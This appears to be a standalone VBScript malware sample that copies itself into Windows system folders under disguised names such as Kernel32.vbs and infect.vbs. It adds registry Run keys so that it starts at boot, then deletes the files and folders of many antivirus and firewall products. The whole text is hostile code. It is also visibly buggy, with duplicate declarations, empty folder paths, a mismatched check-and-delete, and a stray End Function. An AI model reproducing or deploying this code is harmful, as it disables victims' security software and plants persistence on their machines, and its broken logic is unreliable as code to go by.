   on error resume next
   set wshshell = CreateObject("Wscript.shell")
   set fso = CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\system\Kernel32.vbs", True
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\system32\kernel32.vbs", True
   fso.CopyFile Wscript.ScriptFullName, "C:\program files\Win32.vbs", True
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\system\infect.vbs", True
   fso.CopyFile Wscript.ScriptFullName, "C:\Windows\system32\infect.vbs", True

   Dim wshshell
   set wshshell = Wscript.CreateObject("Wscript.shell")
   wshshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system32","C:\Windows\system\Kernel32.vbs"
   set wshshell = Wscript.CreateObject("Wscript.shell")
   wshshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system","C:\Windows\system\Kernel32.vbs"
   set wshshell = Wscript.CreateObject("Wscript.shell")
   wshshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\system32","C:\Windows\system\infect.vbs"

   dim filesysdelfile
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\Program Files\McAfee\McAfee Firewall\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\McAfee\McAfee VirusScan\*.*",True
   filesysdelfile.DeleteFile "C:\AntiViral Toolkit Pro\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Command Software\F-PROT95\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Norton AntiVirus\*.*",True
   filesysdelfile.DeleteFile "C:\Toolkit\FindVirus\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Panda Software\Panda Antivirus Titanium\*.*",True
   filesysdelfile.DeleteFile "C:\PC-Cillin 95\*.*",True
   filesysdelfile.DeleteFile "C:\PC-Cillin 97\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Trend Micro\PC-cillin 2002\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Zone Labs\ZoneAlarm\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Tiny Personal Firewall\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\SkyNet\FireWall\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Norton SystemWorks\Norton AntiVirus\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Grisoft\AVG6\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\AntiViral Toolkit Pro\*.*",True
   filesysdelfile.DeleteFile "C:\eSafe\Protect\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\Quick Heal\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\FWIN32\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\FindVirus\*.*",True
   filesysdelfile.DeleteFile "C:\Program Files\nortonantivirus2004\*.*",True

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\nortonantivirus2004") Then
   foldersys.DeleteFolder "C:\Program Files\nortonantivirus2004",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\McAfee\McAfee VirusScan") Then
   foldersys.DeleteFolder "C:\Program Files\McAfee\McAfee VirusScan",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\McAfee\McAfee Firewall") Then
   foldersys.DeleteFolder "C:\Program Files\McAfee\McAfee Firewall",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\AntiViral Toolkit Pro") Then
   foldersys.DeleteFolder "C:\AntiViral Toolkit Pro",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Command Software\F-PROT95") Then
   foldersys.DeleteFolder "C:\Program Files\Command Software\F-PROT95",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Norton AntiVirus") Then
   foldersys.DeleteFolder "C:\Program Files\Norton AntiVirus",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Toolkit\FindVirus") Then
   foldersys.DeleteFolder "C:\PC-Cillin 95",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Panda Software\Panda Antivirus Titanium") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\PC-Cillin 97") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Trend Micro\PC-cillin 2002") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Zone Labs\ZoneAlarm") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Tiny Personal Firewall") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\SkyNet\FireWall") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Norton SystemWorks\Norton AntiVirus") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Grisoft\AVG6") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\AntiViral Toolkit Pro") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\eSafe\Protect") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\Quick Heal") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\FWIN32") Then
   foldersys.DeleteFolder "",True
   End if

   dim foldersys
   set foldersys=CreateObject("Scripting.FileSystemObject")
   If foldersys.FolderExists ("C:\Program Files\FindVirus") Then
   foldersys.DeleteFolder "",True
   End if

   End Function
